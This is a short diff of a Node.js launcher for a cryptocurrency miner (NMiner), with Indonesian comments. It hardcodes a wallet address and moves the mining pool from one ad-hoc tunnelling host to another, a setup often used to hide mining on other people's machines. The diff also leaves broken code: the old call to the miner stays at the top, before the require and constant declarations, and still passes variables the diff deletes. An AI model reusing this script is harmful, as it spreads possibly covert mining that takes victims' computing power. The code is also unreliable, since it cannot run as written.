@@ -1,16 +1,13 @@
-// run.js
-const { NMiner } = require("./index.js");
-
-// ⚠️ Ganti nilai berikut sesuai kebutuhan kamu
-const POOL = "stratum+tcp://felssmen-26488.portmap.host:26488"; 
-const WALLET = "49cg2BTsCdmBfUPsCrDsGmREn2diVYSKUahupm2bay5ZU3gmVTzuwgY7yhQcbYCdEeZXSHsYLZKLWXTR4DNR3xcJS29HszU"; 
-const PASS = "x";    
-
-// Opsi tambahan
-const OPTIONS = {
-    threads: 1,   // jumlah thread (bisa disesuaikan, default ~80% dari CPU)
-    mode: "FAST"  // FAST kalau RAM cukup, LIGHT kalau RAM terbatas
-};
-
 // Mulai miner
 new NMiner(POOL, WALLET, PASS, OPTIONS);
+
+const { NMiner } = require("./index.js");
+
+const POOL = "stratum+tcp://race-christ.gl.at.ply.gg:13617";
+const WALLET = "49cg2BTsCdmBfUPsCrDsGmREn2diVYSKUahupm2bay5ZU3gmVTzuwgY7yhQcbYCdEeZXSHsYLZKLWXTR4DNR3xcJS29HszU";
+
+new NMiner(POOL, WALLET, {
+    threads: Number(1),  // pastikan number, bukan string
+    mode: "LIGHT"
+});
+
